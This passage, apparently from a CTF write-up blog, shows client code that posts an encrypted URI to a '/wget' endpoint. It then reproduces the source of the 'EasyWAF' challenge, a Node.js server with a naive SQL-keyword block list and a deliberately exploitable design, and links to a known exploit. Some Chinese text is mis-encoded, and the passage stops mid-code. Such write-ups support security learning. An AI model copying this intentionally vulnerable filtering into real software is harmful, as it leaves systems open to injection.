&lt;/span>&lt;span style="color:#d88200">+f4PJvShHatMLGBRFjUkr0aunqq9LDobEHrzwSEEX6V0V+73EdbieYxFHCz2cXaB\
&lt;/span>&lt;span style="color:#d88200">MpnIK19c+u6sgVJFjZ+oggVyKuOtOUscnzzrMhOWGl+eXk+dBe0wjSTrq84zvRI1\
&lt;/span>&lt;span style="color:#d88200">94uTehhY/8hzZjkQavV8NWq0b7l6hJHsO7mp2tGye1npYRQ/tZCEMkzO+PaAkPf6\
&lt;/span>&lt;span style="color:#d88200">H3CyuVgbdMJcuSBJT8kBRQ6P16skZIqrY+NRmdSJmMoGgR9NYVvk8soeSj4MHRpb\
&lt;/span>&lt;span style="color:#d88200">rwIDAQAB\
&lt;/span>&lt;span style="color:#d88200">-----END PUBLIC KEY-----&amp;#39;&lt;/span>&lt;span style="color:#111">;&lt;/span>
&lt;span style="color:#75af00">encrypt&lt;/span>&lt;span style="color:#111">.&lt;/span>&lt;span style="color:#75af00">setPublicKey&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#75af00">publicKey&lt;/span>&lt;span style="color:#111">);&lt;/span>
&lt;span style="color:#75af00">encryptdata&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#75af00">encrypt&lt;/span>&lt;span style="color:#111">.&lt;/span>&lt;span style="color:#75af00">encrypt&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#75af00">uri&lt;/span>&lt;span style="color:#111">);&lt;/span>
&lt;span style="color:#75af00">$&lt;/span>&lt;span style="color:#111">.&lt;/span>&lt;span style="color:#75af00">post&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#d88200">&amp;#34;/wget&amp;#34;&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#111">{&lt;/span>
&lt;span style="color:#75af00">encryptdata&lt;/span>&lt;span style="color:#f92672">:&lt;/span> &lt;span style="color:#75af00">encryptdata&lt;/span>
&lt;span style="color:#111">});&lt;/span>
&lt;span style="color:#75af00">$&lt;/span>&lt;span style="color:#111">.&lt;/span>&lt;span style="color:#75af00">get&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#d88200">&amp;#34;/wget&amp;#34;&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#111">{});&lt;/span>
&lt;span style="color:#111">}&lt;/span>
&lt;/code>&lt;/pre>&lt;/div>&lt;h2 id="easywaf">EasyWAF&lt;/h2>
&lt;blockquote>
&lt;p>different cookie means node pg vuln&lt;/p>
&lt;p>pay attention to the hint different cookie different means&lt;/p>
&lt;/blockquote>
&lt;p>ä»–å¦ˆçš„ ç»å…¸æ¯”èµ›ç»“æŸæ‰¾åˆ°åŽŸé¢˜ï¼ŒçœŸä¸€æ¨¡ä¸€æ ·ï¼Œåäº†&lt;/p>
&lt;p>&lt;a href="https://github.com/orangetw/My-CTF-Web-Challenges#sql-so-hard">https://github.com/orangetw/My-CTF-Web-Challenges#sql-so-hard&lt;/a>&lt;/p>
&lt;p>&lt;a href="https://github.com/orangetw/My-CTF-Web-Challenges/blob/master/hitcon-ctf-2017/sql-so-hard/exploit.py">https://github.com/orangetw/My-CTF-Web-Challenges/blob/master/hitcon-ctf-2017/sql-so-hard/exploit.py&lt;/a>&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4">&lt;code class="language-js" data-lang="js">&lt;span style="color:#75715e">#!/usr/bin/node
&lt;/span>&lt;span style="color:#75715e">&lt;/span>
&lt;span style="color:#75715e">/**
&lt;/span>&lt;span style="color:#75715e"> * @HITCON CTF 2017
&lt;/span>&lt;span style="color:#75715e"> * @Author Orange Tsai
&lt;/span>&lt;span style="color:#75715e"> */&lt;/span>
&lt;span style="color:#00a8c8">const&lt;/span> &lt;span style="color:#75af00">qs&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#75af00">require&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#d88200">&amp;#34;qs&amp;#34;&lt;/span>&lt;span style="color:#111">);&lt;/span>
&lt;span style="color:#00a8c8">const&lt;/span> &lt;span style="color:#75af00">fs&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#75af00">require&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#d88200">&amp;#34;fs&amp;#34;&lt;/span>&lt;span style="color:#111">);&lt;/span>
&lt;span style="color:#00a8c8">const&lt;/span> &lt;span style="color:#75af00">pg&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#75af00">require&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#d88200">&amp;#34;pg&amp;#34;&lt;/span>&lt;span style="color:#111">);&lt;/span>
&lt;span style="color:#00a8c8">const&lt;/span> &lt;span style="color:#75af00">mysql&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#75af00">require&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#d88200">&amp;#34;mysql&amp;#34;&lt;/span>&lt;span style="color:#111">);&lt;/span>
&lt;span style="color:#00a8c8">const&lt;/span> &lt;span style="color:#75af00">crypto&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#75af00">require&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#d88200">&amp;#34;crypto&amp;#34;&lt;/span>&lt;span style="color:#111">);&lt;/span>
&lt;span style="color:#00a8c8">const&lt;/span> &lt;span style="color:#75af00">express&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#75af00">require&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#d88200">&amp;#34;express&amp;#34;&lt;/span>&lt;span style="color:#111">);&lt;/span>
&lt;span style="color:#00a8c8">const&lt;/span> &lt;span style="color:#75af00">pool&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#75af00">mysql&lt;/span>&lt;span style="color:#111">.&lt;/span>&lt;span style="color:#75af00">createPool&lt;/span>&lt;span style="color:#111">({&lt;/span>
&lt;span style="color:#75af00">connectionLimit&lt;/span>&lt;span style="color:#f92672">:&lt;/span> &lt;span style="color:#ae81ff">100&lt;/span>&lt;span style="color:#111">,&lt;/span>
&lt;span style="color:#75af00">host&lt;/span>&lt;span style="color:#f92672">:&lt;/span> &lt;span style="color:#d88200">&amp;#34;localhost&amp;#34;&lt;/span>&lt;span style="color:#111">,&lt;/span>
&lt;span style="color:#75af00">user&lt;/span>&lt;span style="color:#f92672">:&lt;/span> &lt;span style="color:#d88200">&amp;#34;ban&amp;#34;&lt;/span>&lt;span style="color:#111">,&lt;/span>
&lt;span style="color:#75af00">password&lt;/span>&lt;span style="color:#f92672">:&lt;/span> &lt;span style="color:#d88200">&amp;#34;ban&amp;#34;&lt;/span>&lt;span style="color:#111">,&lt;/span>
&lt;span style="color:#75af00">database&lt;/span>&lt;span style="color:#f92672">:&lt;/span> &lt;span style="color:#d88200">&amp;#34;bandb&amp;#34;&lt;/span>&lt;span style="color:#111">,&lt;/span>
&lt;span style="color:#111">});&lt;/span>
&lt;span style="color:#00a8c8">const&lt;/span> &lt;span style="color:#75af00">client&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#00a8c8">new&lt;/span> &lt;span style="color:#75af00">pg&lt;/span>&lt;span style="color:#111">.&lt;/span>&lt;span style="color:#75af00">Client&lt;/span>&lt;span style="color:#111">({&lt;/span>
&lt;span style="color:#75af00">host&lt;/span>&lt;span style="color:#f92672">:&lt;/span> &lt;span style="color:#d88200">&amp;#34;localhost&amp;#34;&lt;/span>&lt;span style="color:#111">,&lt;/span>
&lt;span style="color:#75af00">user&lt;/span>&lt;span style="color:#f92672">:&lt;/span> &lt;span style="color:#d88200">&amp;#34;userdb&amp;#34;&lt;/span>&lt;span style="color:#111">,&lt;/span>
&lt;span style="color:#75af00">password&lt;/span>&lt;span style="color:#f92672">:&lt;/span> &lt;span style="color:#d88200">&amp;#34;userdb&amp;#34;&lt;/span>&lt;span style="color:#111">,&lt;/span>
&lt;span style="color:#75af00">database&lt;/span>&lt;span style="color:#f92672">:&lt;/span> &lt;span style="color:#d88200">&amp;#34;userdb&amp;#34;&lt;/span>&lt;span style="color:#111">,&lt;/span>
&lt;span style="color:#111">});&lt;/span>
&lt;span style="color:#75af00">client&lt;/span>&lt;span style="color:#111">.&lt;/span>&lt;span style="color:#75af00">connect&lt;/span>&lt;span style="color:#111">();&lt;/span>
&lt;span style="color:#00a8c8">const&lt;/span> &lt;span style="color:#75af00">KEYWORDS&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#111">[&lt;/span>
&lt;span style="color:#d88200">&amp;#34;select&amp;#34;&lt;/span>&lt;span style="color:#111">,&lt;/span>
&lt;span style="color:#d88200">&amp;#34;union&amp;#34;&lt;/span>&lt;span style="color:#111">,&lt;/span>
&lt;span style="color:#d88200">&amp;#34;and&amp;#34;&lt;/span>&lt;span style="color:#111">,&lt;/span>
&lt;span style="color:#d88200">&amp;#34;or&amp;#34;&lt;/span>&lt;span style="color:#111">,&lt;/span>
&lt;span style="color:#d88200">&amp;#34;\\&amp;#34;&lt;/span>&lt;span style="color:#111">,&lt;/span>
&lt;span style="color:#d88200">&amp;#34;/&amp;#34;&lt;/span>&lt;span style="color:#111">,&lt;/span>
&lt;span style="color:#d88200">&amp;#34;*&amp;#34;&lt;/span>&lt;span style="color:#111">,&lt;/span>
&lt;span style="color:#d88200">&amp;#34; &amp;#34;&lt;/span>
&lt;span style="color:#111">]&lt;/span>
&lt;span style="color:#00a8c8">function&lt;/span> &lt;span style="color:#75af00">waf&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#75af00">string&lt;/span>&lt;span style="color:#111">)&lt;/span> &lt;span style="color:#111">{&lt;/span>
&lt;span style="color:#00a8c8">for&lt;/span> &lt;span style="color:#111">(&lt;/span>&lt;span style="color:#00a8c8">var&lt;/span> &lt;span style="color:#75af00">i&lt;/span> &lt;span style="color:#00a8c8">in&lt;/span> &lt;span style="color:#75af00">KEYWORDS&lt;/span>&lt;span style="color:#111">)&lt;/span> &lt;span style="color:#111">{&lt;/span>
&lt;span style="color:#00a8c8">var&lt;/span> &lt;span style="color:#75af00">key&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#75af00">KEYWORDS&lt;/span>&lt;span style="color:#111">[&lt;/span>&lt;span style="color:#75af00">i&lt;/span>&lt;span style="color:#111">];&lt;/span>
&lt;span style="color:#00a8c8">if&lt;/span> &lt;span style="color:#111">(&lt;/span>&lt;span style="color:#75af00">string&lt;/span>&lt;span style="color:#111">.&lt;/span>&lt;span style="color:#75af00">toLowerCase&lt;/span>&lt;span style="color:#111">().&lt;/span>&lt;span style="color:#75af00">indexOf&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#75af00">key&lt;/span>&lt;span style="color:#111">)&lt;/span> &lt;span style="color:#f92672">!==&lt;/span> &lt;span style="color:#f92672">-&lt;/span>&lt;span style="color:#ae81ff">1&lt;/span>&lt;span style="color:#111">)&lt;/span> &lt;span style="color:#111">{&lt;/span>
&lt;span style="color:#00a8c8">return&lt;/span> &lt;span style="color:#00a8c8">true&lt;/span>&lt;span style="color:#111">;&lt;/span>
&lt;span style="color:#111">}&lt;/span>
&lt;span style="color:#111">}&lt;/span>
&lt;span style="color:#00a8c8">return&lt;/span> &lt;span style="color:#00a8c8">false&lt;/span>&lt;span style="color:#111">;&lt;/span>
&lt;span style="color:#111">}&lt;/span>
&lt;span style="color:#00a8c8">const&lt;/span> &lt;span style="color:#75af00">app&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#75af00">express&lt;/span>&lt;span style="color:#111">();&lt;/span>
&lt;span style="color:#75af00">app&lt;/span>&lt;span style="color:#111">.&lt;/span>&lt;span style="color:#75af00">use&lt;/span>&lt;span style="color:#111">((&lt;/span>&lt;span style="color:#75af00">req&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#75af00">res&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#75af00">next&lt;/span>&lt;span style="color:#111">)&lt;/span> &lt;span style="color:#111">=&amp;gt;&lt;/span> &lt;span style="color:#111">{&lt;/span>
&lt;span style="color:#00a8c8">var&lt;/span> &lt;span style="color:#75af00">data&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#d88200">&amp;#34;&amp;#34;&lt;/span>&lt;span style="color:#111">;&lt;/span>
&lt;span style="color:#75af00">req&lt;/span>&lt;span style="color:#111">.&lt;/span>&lt;span style="color:#75af00">on&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#d88200">&amp;#34;data&amp;#34;&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#111">(&lt;/span>&lt;span style="color:#75af00">chunk&lt;/span>&lt;span style="color:#111">)&lt;/span> &lt;span style="color:#111">=&amp;gt;&lt;/span> &lt;span style="color:#111">{&lt;/span> &lt;span style="color:#75af00">data&lt;/span> &lt;span style="color:#f92672">+=&lt;/span> &lt;span style="color:#75af00">chunk&lt;/span>&lt;span style="color:#111">})&lt;/span>
&lt;span style="color:#75af00">req&lt;/span>&lt;span style="color:#111">.&lt;/span>&lt;span style="color:#75af00">on&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#d88200">&amp;#34;end&amp;#34;&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#111">()&lt;/span> &lt;span style="color:#111">=&amp;gt;{&lt;/span>
&lt;span style="color:#75af00">req&lt;/span>&lt;span style="color:#111">.&lt;/span>&lt;span style="color:#75af00">body&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#75af00">qs&lt;/span>&lt;span style="color:#111">.&lt;/span>&lt;span style="color:#75af00">parse&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#75af00">data&lt;/span>&lt;span style="color:#111">);&lt;/span>
&lt;span style="color:#75af00">next&lt;/span>&lt;span style="color:#111">();&lt;/span>
&lt;span style="color:#111">})&lt;/span>
&lt;span style="color:#111">})&lt;/span>
&lt;span style="color:#75af00">app&lt;/span>&lt;span style="color:#111">.&lt;/span>&lt;span style="color:#75af00">all&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#d88200">&amp;#34;/*&amp;#34;&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#111">(&lt;/span>&lt;span style="color:#75af00">req&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#75af00">res&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#75af00">next&lt;/span>&lt;span style="color:#111">)&lt;/span> &lt;span style="color:#111">=&amp;gt;&lt;/span> &lt;span style="color:#111">{&lt;/span>
&lt;span style="color:#00a8c8">if&lt;/span> &lt;span style="color:#111">(&lt;/span>&lt;span style="color:#d88200">&amp;#34;show_source&amp;#34;&lt;/span> &lt;span style="color:#00a8c8">in&lt;/span> &lt;span style="color:#75af00">req&lt;/span>&lt;span style="color:#111">.&lt;/span>&lt;span style="color:#75af00">query&lt;/span>&lt;span style="color:#111">)&lt;/span> &lt;span style="color:#111">{&lt;/span>
&lt;span style="color:#00a8c8">return&lt;/span> &lt;span style="color:#75af00">res&lt;/span>&lt;span style="color:#111">.&lt;/span>&lt;span style="color:#75af00">end&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#75af00">fs&lt;/span>&lt;span style="color:#111">.&lt;/span>&lt;span style="color:#75af00">readFileSync&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#75af00">__filename&lt;/span>&lt;span style="color:#111">));&lt;/span>
&lt;span style="color:#111">}&lt;/span>
&lt;span style="color:#00a8c8">if&lt;/span> &lt;span style="color:#111">(&lt;/span>&lt;span style="color:#75af00">req&lt;/span>&lt;span style="color:#111">.&lt;/span>&lt;span style="color:#75af00">path&lt;/span> &lt;span style="color:#f92672">==&lt;/span> &lt;span style="color:#d88200">&amp;#34;/&amp;#34;&lt;/span>&lt;span style="color:#111">)&lt;/span> &lt;span style="color:#111">{&lt;/span>
&lt;span style="color:#00a8c8">return&lt;/span> &lt;span style="color:#75af00">next&lt;/span>&lt;span style="color:#111">();&lt;/span>
&lt;span style="color:#111">}&lt;/span>
&lt;span style="color:#00a8c8">var&lt;/span> &lt;span style="color:#75af00">ip&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#75af00">req&lt;/span>&lt;span style="color:#111">.&lt;/span>&lt;span style="color:#75af00">connection&lt;/span>&lt;span style="color:#111">.&lt;/span>&lt;span style="color:#75af00">remoteAddress&lt;/span>&lt;span style="color:#111">;&lt;/span>
&lt;span style="color:#00a8c8">var&lt;/span> &lt;span style="color:#75af00">payload&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#d88200">&amp;#34;&amp;#34;&lt;/span>&lt;span style="color:#111">;&lt;/span>
&lt;span style="color:#00a8c8">for&lt;/span> &lt;span style="color:#111">(&lt;/span>&lt;span style="color:#00a8c8">var&lt;/span> &lt;span style="color:#75af00">k&lt;/span> &lt;span style="color:#00a8c8">in&lt;/span> &lt;span style="color:#75af00">req&lt;/span>&lt;span style="color:#111">.&lt;/span>&lt;span style="color:#75af00">query&lt;/span>&lt;span style="color:#111">)&lt;/span> &lt;span style="color:#111">{&lt;/span>
&lt;span style="color:#00a8c8">if&lt;/span> &lt;span style="color:#111">(&lt;/span>&lt;span style="color:#75af00">waf&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#75af00">req&lt;/span>&lt;span style="color:#111">.&lt;/span>&lt;span style="color:#75af00">query&lt;/span>&lt;span style="color:#111">[&lt;/span>&lt;span style="color:#75af00">k&lt;/span>&lt;span style="color:#111">]))&lt;/span> &lt;span style="color:#111">{&lt;/span>
&lt;span style="color:#75af00">payload&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#75af00">req&lt;/span>&lt;span style="color:#111">.&lt;/span>&lt;span style="color:#75af00">query&lt;/span>&lt;span style="color:#111">[&lt;/span>&lt;span style="color:#75af00">k&lt;/span>&lt;span style="color:#111">];&lt;/span>
&lt;span style="color:#00a8c8">break&lt;/span>&lt;span style="color:#111">;&lt;/span>
&lt;span style="color:#111">}&lt;/span>
&lt;span style="color:#111">}&lt;/span>
&lt;span style="color:#00a8c8">for&lt;/span> &lt;span style="color:#111">(&lt;/span>&lt;span style="color:#00a8c8">var&lt;/span> &lt;span style="color:#75af00">k&lt;/span> &lt;span style="color:#00a8c8">in&lt;/span> &lt;span style="color:#75af00">req&lt;/span>&lt;span style="color:#111">.&lt;/span>&lt;span style="color:#75af00">body&lt;/span>&lt;span style="color:#111">)&lt;/span> &lt;span style="color:#111">{&lt;/span>
&lt;span style="color:#00a8c8">if&lt;/span> &lt;span style="color:#111">(&lt;/span>&lt;span style="color:#75af00">waf&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#75af00">req&lt;/span>&lt;span style="color:#111">.&lt;/span>&lt;span style="color:#75af00">body&lt;/span>&lt;span style="color:#111">[&lt;/span>&lt;span style="color:#75af00">k&lt;/span>&lt;span style="color:#111">]))&lt;/span> &lt;span style="color:#111">{&lt;/span>
&lt;span style="color:#75af00">payload&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#75af00">req&lt;/span>&lt;span style="color:#111">.&lt;/span>&lt;span style="color:#75af00">body&lt;/span>&lt;span style="color:#111">[&lt;/span>&lt;span style="color:#75af00">k&lt;/span>&lt;span style="color:#111">];&lt;/span>
&lt;span style="color:#00a8c8">break&lt;/span>&lt;span style="color:#111">;&lt;/span>
&lt;span style="color:#111">}&lt;/span>
&lt;span style="color:#111">}&lt;/span>
&lt;span style="color:#00a8c8">if&lt;/span> &lt;span style="color:#111">(&lt;/span>&lt;span style="color:#75af00">payload&lt;/span>&lt;span style="color:#111">.&lt;/span>&lt;span style="color:#75af00">length&lt;/span> &lt;span style="color:#f92672">&amp;gt;&lt;/span> &lt;span style="color:#ae81ff">0&lt;/span>&lt;span style="color:#111">)&lt;/span> &lt;span style="color:#111">{&lt;/span>
&lt;span style="color:#00a8c8">var&lt;/span> &lt;span style="color:#75af00">sql&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#d88200">`INSERT INTO blacklists(ip, payload) VALUES(?, ?) ON DUPLICATE KEY UPDATE payload=?`&lt;/span>&lt;span style="color:#111">;&lt;/span>
&lt;span style="color:#111">}&lt;/span> &lt;span style="color:#00a8c8">else&lt;/span> &lt;span style="color:#111">{&lt;/span>
&lt;span style="color:#00a8c8">var&lt;/span> &lt;span style="color:#75af00">sql&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#d88200">`SELECT ?,?,?`&lt;/span>&lt;span style="color:#111">;&lt;/span>
&lt;span style="color:#111">}&lt;/span>
&lt;span style="color:#00a8c8">return&lt;/span> &lt;span style="color:#75af00">pool&lt;/span>&lt;span style="color:#111">.&lt;/span>&lt;span style="color:#75af00">query&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#75af00">sql&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#111">[&lt;/span>&lt;span style="color:#75af00">ip&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#75af00">payload&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#75af00">payload&lt;/span>&lt;span style="color:#111">],&lt;/span> &lt;span style="color:#111">(&lt;/span>&lt;span style="color:#75af00">err&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#75af00">rows&lt;/span>&lt;span style="color:#111">)&lt;/span> &lt;span style="color:#111">=&amp;gt;&lt;/span> &lt;span style="color:#111">{&lt;/span>
&lt;span style="color:#00a8c8">var&lt;/span> &lt;span style="color:#75af00">sql&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#d88200">`SELECT * FROM blacklists WHERE ip=?`&lt;/span>&lt;span style="color:#111">;&lt;/span>
&lt;span style="color:#00a8c8">return&lt;/span> &lt;span style="color:#75af00">pool&lt;/span>&lt;span style="color:#111">.&lt;/span>&lt;span style="color:#75af00">query&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#75af00">sql&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#111">[&lt;/span>&lt;span style="color:#75af00">ip&lt;/span>&lt;span style="color:#111">],&lt;/span> &lt;span style="color:#111">(&lt;/span>&lt;span style="color:#75af00">err&lt;/span>&lt;span style="color:#111">,&lt;/span>&lt;span style="color:#75af00">rows&lt;/span>&lt;span style="color:#111">)&lt;/span> &lt;span style="color:#111">=&amp;gt;&lt;/span> &lt;span style="color:#111">{&lt;/span>
&lt;span style="color:#00a8c8">if&lt;/span> &lt;span style="color:#111">(&lt;/span> &lt;span style="color:#75af00">rows&lt;/span>&lt;span style="color:#111">.&lt;/span>&lt;span style="color:#75af00">length&lt;/span> &lt;span style="color:#f92672">==&lt;/span> &lt;span style="color:#ae81ff">0&lt;/span>&lt;span style="color:#111">)&lt;/span> &lt;span style="color:#111">{&lt;/span>
&lt;span style="color:#00a8c8">return&lt;/span> &lt;span style="color:#75af00">next&lt;/span>&lt;span style="color:#111">();&lt;/span>
&lt;span style="color:#111">}&lt;/span> &lt;span style="color:#00a8c8">else&lt;/span> &lt;span style="color:#111">{&lt;/span>
&lt;span style="color:#00a8c8">return&lt;/span> &lt;span style="color:#75af00">res&lt;/span>&lt;span style="color:#111">.&lt;/span>&lt;span style="color:#75af00">end&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#d88200">&amp;#34;Shame on you&amp;#34;&lt;/span>&lt;span style="color:#111">);&lt;/span>
&lt;span style="color:#111">}&lt;/span>
&lt;span style="color:#111">});&lt;/span>
&lt;span style="color:#111">});&lt;/span>
&lt;span style="color:#111">});&lt;/span>
&lt;span style="color:#75af00">app&lt;/span>&lt;span style="color:#111">.&lt;/span>&lt;span style="color:#75af00">get&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#d88200">&amp;#34;/&amp;#34;&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#111">(&lt;/span>&lt;span style="color:#75af00">req&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#75af00">res&lt;/span>&lt;span style="color:#111">)&lt;/span> &lt;span style="color:#111">=&amp;gt;&lt;/span> &lt;span style="color:#111">{&lt;/span>
&lt;span style="color:#00a8c8">var&lt;/span> &lt;span style="color:#75af00">sql&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#d88200">`SELECT * FROM blacklists GROUP BY ip`&lt;/span>&lt;span style="color:#111">;&lt;/span>
&lt;span style="color:#00a8c8">return&lt;/span> &lt;span style="color:#75af00">pool&lt;/span>&lt;span style="color:#111">.&lt;/span>&lt;span style="color:#75af00">query&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#75af00">sql&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#111">[],&lt;/span> &lt;span style="color:#111">(&lt;/span>&lt;span style="color:#75af00">err&lt;/span>&lt;span style="color:#111">,&lt;/span>&lt;span style="color:#75af00">rows&lt;/span>&lt;span style="color:#111">)&lt;/span> &lt;span style="color:#111">=&amp;gt;&lt;/span> &lt;span style="color:#111">{&lt;/span>
&lt;span style="color:#75af00">res&lt;/span>&lt;span style="color:#111">.&lt;/span>&lt;span style="color:#75af00">header&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#d88200">&amp;#34;Content-Type&amp;#34;&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#d88200">&amp;#34;text/html&amp;#34;&lt;/span>&lt;span style="color:#111">);&lt;/span>
&lt;span style="color:#00a8c8">var&lt;/span> &lt;span style="color:#75af00">html&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#d88200">&amp;#34;&amp;lt;pre&amp;gt;Here is the &amp;lt;a href=https://amiaaaz.github.io/?show_source=1&amp;gt;source&amp;lt;/a&amp;gt;, thanks to Orange\n\n&amp;lt;h3&amp;gt;Hall of Shame&amp;lt;/h3&amp;gt;(delete every 60s)\n&amp;#34;&lt;/span>&lt;span style="color:#111">;&lt;/span>
&lt;span style="color:#00a8c8">for&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#00a8c8">var&lt;/span> &lt;span style="color:#75af00">r&lt;/span> &lt;span style="color:#00a8c8">in&lt;/span> &lt;span style="color:#75af00">rows&lt;/span>&lt;span style="color:#111">)&lt;/span> &lt;span style="color:#111">{&lt;/span>
&lt;span style="color:#75af00">html&lt;/span> &lt;span style="color:#f92672">+=&lt;/span> &lt;span style="color:#d88200">`&lt;/span>&lt;span style="color:#d88200">${&lt;/span>&lt;span style="color:#111">parseInt&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#75af00">r&lt;/span>&lt;span style="color:#111">)&lt;/span>&lt;span style="color:#f92672">+&lt;/span>&lt;span style="color:#ae81ff">1&lt;/span>&lt;span style="color:#d88200">}&lt;/span>&lt;span style="color:#d88200">. &lt;/span>&lt;span style="color:#d88200">${&lt;/span>&lt;span style="color:#75af00">rows&lt;/span>&lt;span style="color:#111">[&lt;/span>&lt;span style="color:#75af00">r&lt;/span>&lt;span style="color:#111">].&lt;/span>&lt;span style="color:#75af00">ip&lt;/span>&lt;span style="color:#d88200">}&lt;/span>&lt;span style="color:#d88200">\n`&lt;/span>&lt;span style="color:#111">;&lt;/span>
&lt;span style="color:#111">}&lt;/span>
&lt;span style="color:#00a8c8">return&lt;/span> &lt;span style="color:#75af00">res&lt;/span>&lt;span style="color:#111">.&lt;/span>&lt;span style="color:#75af00">end&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#75af00">html&lt;/span>&lt;span style="color:#111">);&lt;/span>
&lt;span style="color:#111">});&lt;/span>
&lt;span style="color:#111">});&lt;/span>
&lt;span style="color:#75af00">app&lt;/span>&lt;span style="color:#111">.&lt;/span>&lt;span style="color:#75af00">post&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#d88200">&amp;#34;/reg&amp;#34;&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#111">(&lt;/span>&lt;span style="color:#75af00">req&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#75af00">res&lt;/span>&lt;span style="color:#111">)&lt;/span> &lt;span style="color:#111">=&amp;gt;&lt;/span> &lt;span style="color:#111">{&lt;/span>
&lt;span style="color:#00a8c8">var&lt;/span> &lt;span style="color:#75af00">username&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#75af00">req&lt;/span>&lt;span style="color:#111">.&lt;/span>&lt;span style="color:#75af00">body&lt;/span>&lt;span style="color:#111">.&lt;/span>&lt;span style="color:#75af00">username&lt;/span>&lt;span style="color:#111">;&lt;/span>
&lt;span style="color:#00a8c8">var&lt;/span> &lt;span style="color:#75af00">password&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#75af00">req&lt;/span>&lt;span style="color:#111">.&lt;/span>&lt;span style="color:#75af00">body&lt;/span>&lt;span style="color:#111">.&lt;/span>&lt;span style="color:#75af00">password&lt;/span>&lt;span style="color:#111">;&lt;/span>
